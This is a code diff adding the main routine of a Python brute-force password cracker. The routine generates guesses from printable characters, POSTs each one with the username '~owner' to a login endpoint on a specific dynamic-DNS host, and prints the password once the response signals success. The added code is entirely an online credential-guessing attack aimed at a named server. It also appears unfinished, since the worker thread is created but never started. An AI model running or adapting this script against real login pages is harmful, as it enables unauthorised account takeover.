@@ -32,7 +32,34 @@ def charCheck(charNumb, password, charRange, commandQueue, tryQueue):
 
 
 if __name__ == "__main__":
+    tryQueue=Queue()
+    commandQueue=Queue()
+    password=[]
+    asciiChars=string.printable
+    maxChars=10
+    username="~owner"
 
+    for charAmount in range(1,maxChars+1):
+        password.append("")
+        t = threading.Thread(target=charCheck, args = (0,password,asciiChars,commandQueue,tryQueue))
+
+        while True:
+            latestTry=tryQueue.get()
+
+            if latestTry == False:
+                break
+            else:
+                payload = {'username':username,'password':latestTry}
+                r = requests.post("http://lucieng.ddns.net:5000/loginCheck", data=payload)
+
+                if r.text[80:81]==u'e':
+                    commandQueue.put(True)
+                    print("WE DID IT JIM")
+                    print("it is: "+latestTry)
+                    sys.exit()
+                elif r.text[80:81]!=u'o':
+                    commandQueue.put(False)
+                    print("incorrect")
 
 '''
 To do:
